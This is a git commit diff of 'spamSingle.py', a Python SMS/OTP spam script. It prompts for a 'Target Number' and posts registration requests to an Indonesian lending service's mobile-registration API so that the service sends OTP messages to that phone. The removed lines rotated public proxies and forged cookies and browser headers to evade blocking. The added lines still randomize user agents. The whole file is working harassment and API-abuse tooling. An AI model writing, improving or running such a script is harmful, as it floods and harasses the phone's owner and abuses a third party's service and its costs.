cbe909b4d656d0c2c9ef00fe5e4603dcab5bf16f
rezadevs <sawe57192@gmail.com>
2024-08-25 01:04:49 -0700

    Update spamSingle.py

--- spamSingle.py
+++ spamSingle.py
@@ -1,28 +1,19 @@
-import aiohttp
-import asyncio
+import httpx
 import json
 import random
-import uuid
 import logging
-from itertools import cycle
-from colorama import Fore, init
-
-init(autoreset=True)
+import time
 
 # Set up logging
-logging.basicConfig(filename='spam_sms.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(filename='otp_sender.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Define colorama colors
-BlueTerm = Fore.BLUE
+# Define colors for terminal output
+from colorama import Fore, init
+init(autoreset=True)
+
 WhiteTerm = Fore.WHITE
-RedTerm = Fore.RED
 GreenTerm = Fore.GREEN
-YellowTerm = Fore.YELLOW
-
-hijau = "\033[1;92m"
-putih = "\033[1;97m"
-biru = "\033[1;96m"
-kuning = "\033[1;93m"
+RedTerm = Fore.RED
 
 def generate_user_agent():
     browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
@@ -31,97 +22,43 @@ def generate_user_agent():
     os_version = random.randint(10, 15)
     return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"
 
-def generate_accept_language():
-    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
-    random.shuffle(languages)
-    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])
-
-def generate_cookie():
-    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 1999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 1999999999)}.1.1.{random.randint(1000000000, 1999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 1999999999)}~lva~{random.randint(1000000000, 1999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 1999999999)}~v11.lhb~{random.randint(1000000000, 1999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 1999999999)}~lcw~{random.randint(1000000000, 1999999999)}"
-
-def generate_sec_ch_ua():
-    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
-    versions = [str(random.randint(70, 130)) for _ in range(3)]
-    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""
-
-def generate_sec_ch_ua_platform():
-    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
-    return f"\"{random.choice(platforms)}\""
-
 def generate_headers():
     return {
         "Accept": "application/json, text/plain, */*",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Accept-Language": generate_accept_language(),
-        "Content-Length": str(random.randint(20, 50)),  # Random content length
+        "Accept-Encoding": "gzip, deflate, br",
         "Content-Type": "application/json",
-        "Cookie": generate_cookie(),
-        "Origin": "https://app.danacita.co.id",
-        "Referer": f"https://app.danacita.co.id/{random.choice(['home', 'login', 'register'])}",
-        "Sec-Ch-Ua": generate_sec_ch_ua(),
-        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
-        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
-        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
-        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
-        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
         "User-Agent": generate_user_agent()
     }
 
-async def send_request(api_url, headers, data, session, proxy=None, retry_attempts=3, initial_delay=2):
-    for attempt in range(retry_attempts):
-        try:
-            async with session.post(api_url, headers=headers, data=data, proxy=proxy) as response:
-                if response.status == 200:
-                    logging.info(f"Berhasil mengirim SMS via {api_url} - Attempt {attempt + 1}")
-                    print(f"{GreenTerm}Berhasil mengirim SMS via {api_url}")
+async def send_otp(api_url, headers, data, retry_attempts=3, initial_delay=2):
+    async with httpx.AsyncClient() as client:
+        for attempt in range(retry_attempts):
+            try:
+                response = await client.post(api_url, headers=headers, content=data)
+                if response.status_code == 200:
+                    logging.info(f"Successfully sent OTP via {api_url} - Attempt {attempt + 1}")
+                    print(f"{GreenTerm}Successfully sent OTP via {api_url}")
                     return True
                 else:
-                    logging.warning(f"Gagal mengirim SMS via {api_url}. Status code: {response.status} - Attempt {attempt + 1}")
-        except Exception as e:
-            logging.error(f"Terjadi kesalahan: {e} - Attempt {attempt + 1}")
-        
-        # Delay dengan backoff eksponensial
-        await asyncio.sleep(initial_delay * (2 ** attempt))
-    
-    print(f"{RedTerm}Gagal mengirim SMS setelah {retry_attempts} kali percobaan.")
-    return False
+                    logging.warning(f"Failed to send OTP via {api_url}. Status code: {response.status_code} - Attempt {attempt + 1}")
+            except httpx.RequestError as e:
+                logging.error(f"Request error occurred: {e} - Attempt {attempt + 1}")
+            except httpx.HTTPStatusError as e:
+                logging.error(f"HTTP status error occurred: {e} - Attempt {attempt + 1}")
 
-async def fetch_proxies():
-    proxy_source_url = "https://www.proxy-list.download/api/v1/get?type=https"
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(proxy_source_url) as response:
-                if response.status == 200:
-                    proxies = await response.text()
-                    return proxies.splitlines()
-                else:
-                    logging.error(f"Gagal mengambil proxy. Status code: {response.status}")
-                    return []
-    except Exception as e:
-        logging.error(f"Terjadi kesalahan saat mengambil proxy: {e}")
-        return []
+            time.sleep(initial_delay * (2 ** attempt))
+        
+    print(f"{RedTerm}Failed to send OTP after {retry_attempts} attempts.")
+    return False
 
 async def main():
     api_url = "https://api.danacita.co.id/v4/users/mobile_register/"
-    input_number = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")
+    input_number = input(f"{WhiteTerm}Enter Target Number (e.g., +628xxx): ")
+    data_danacita = json.dumps({"username": input_number})
     
-    data_danacita = json.dumps({
-        "username": input_number,
-    })
-
     headers = generate_headers()
-    
-    proxy_list = await fetch_proxies()
-    if not proxy_list:
-        print(f"{RedTerm}Tidak dapat mengambil daftar proxy. Program akan berhenti.")
-        return
-    
-    async with aiohttp.ClientSession() as session:
-        for proxy in cycle(proxy_list):
-            success = await send_request(api_url, headers, data_danacita, session, proxy)
-            if success:
-                break
+    await send_otp(api_url, headers, data_danacita)
 
-# Run the main function
 if __name__ == "__main__":
+    import asyncio
     asyncio.run(main())
